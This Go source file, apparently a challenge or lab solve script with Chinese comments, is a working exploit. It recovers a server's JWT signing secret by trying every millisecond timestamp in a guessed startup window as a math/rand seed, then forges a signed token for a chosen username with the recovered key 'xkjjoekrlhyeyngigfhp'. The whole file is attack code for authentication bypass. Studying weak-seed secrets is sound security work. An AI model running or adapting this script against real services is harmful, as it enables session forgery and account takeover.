package main

import (
	"fmt"
	"github.com/golang-jwt/jwt"
	"math/rand"
	"sync"
	"sync/atomic"
	"time"
)

// 通过传递的seed生成随机数序列，看下是否就是服务器使用的jwt secret
func isSeedOk(jwtToken string, seed int64) string {
	key := randomWithSeed(seed, 20)
	_, err := jwt.Parse(jwtToken, func(token *jwt.Token) (interface{}, error) {
		if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
			return nil, fmt.Errorf("Unexpected signing method: %v", token.Header["alg"])
		}
		return []byte(key), nil
	})
	if err != nil {
		return ""
	}
	return key
}

// Random 随机生成长度为n的小写字母
func randomWithSeed(seed int64, length int) string {
	random := rand.New(rand.NewSource(seed))
	chars := make([]rune, length)
	for i := range chars {
		chars[i] = rune(random.Int()%26) + 'a'
	}
	return string(chars)
}

func crackJwtSecret(start, end, tokenString string) string {

	startTime, err := time.Parse(time.DateTime, start)
	if err != nil {
		panic(err)
	}
	endTime, err := time.Parse(time.DateTime, end)
	if err != nil {
		panic(err)
	}

	taskChannel := make(chan int64, 100)

	// task producer
	producerWg := &sync.WaitGroup{}
	producerWg.Add(1)
	go func() {
		startTs := startTime.UnixMilli()
		endTs := endTime.UnixMilli()
		for startTs <= endTs {
			taskChannel <- startTs
			startTs++
		}
		close(taskChannel)
		producerWg.Done()
	}()

	// TODO 草，我好像写出来一个协同的bug...
	// 用于方便观察爆破进度
	progressWg := &sync.WaitGroup{}
	progressChannel := make(chan int64, 1000)
	total := endTime.UnixMilli() - startTime.UnixMilli()
	progressWg.Add(1)
	go func() {
		defer progressWg.Done()
		doneCount := 0
		for v := range progressChannel {
			doneCount++
			if doneCount%1000000 == 0 {
				fmt.Printf("%d/%d = %f%%\n", doneCount, total, float64(doneCount)/float64(total)*100)
				_ = v
			}
		}
	}()

	// task consumer
	consumerWg := &sync.WaitGroup{}
	isFindSecret := &atomic.Bool{}
	jwtSecret := &atomic.Pointer[string]{}
	for i := 0; i < 100; i++ {
		consumerWg.Add(1)
		go func() {
			defer consumerWg.Done()
			for v := range taskChannel {

				progressChannel <- v

				if isFindSecret.Load() {
					return
				}

				secret := isSeedOk(tokenString, v)
				if secret != "" {
					fmt.Printf("Crack success, ts = %d , secret = %s \n", v, secret)
					isFindSecret.Store(true)
					jwtSecret.Store(&secret)
					return
				}
			}
		}()
	}

	producerWg.Wait()

	consumerWg.Wait()
	close(progressChannel)

	progressWg.Wait()

	if isFindSecret.Load() {
		return *jwtSecret.Load()
	} else {
		return ""
	}
}

// 伪造给定用户的jwt token
func generateJwtToken(secret string, username string) (string, error) {
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
		"username": username,
		"nbf":      time.Date(2015, 10, 10, 12, 0, 0, 0, time.UTC).Unix(),
	})
	return token.SignedString([]byte(secret))
}

func main() {

	//// 随便注册一个用户，然后登录，拿到jwt token开始尝试爆破jwt secret
	//// 猜测服务器可能的启动时间范围，将这个范围内的每个时间戳作为seed来爆破
	//start := "2024-09-01 12:00:00"
	//end := "2024-09-02 00:00:00"
	//// 登录成功之后签发的jwt token
	//tokenString := "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE0NDQ0Nzg0MDAsInVzZXJuYW1lIjoiYSJ9.CHOZ04AjW_efyT0x3O5B3n8Vo2d1ITGowmSJue6SNuY"
	//jwtSecret := crackJwtSecret(start, end, tokenString)
	//println("jwt secret: " + jwtSecret)

	// 然后尝试使用爆破出来的secret伪造jwt token
	token, err := generateJwtToken("xkjjoekrlhyeyngigfhp", "CC11001100")
	if err != nil {
		panic(err)
	}
	fmt.Println("CC11001100 JWT token: " + token)
}
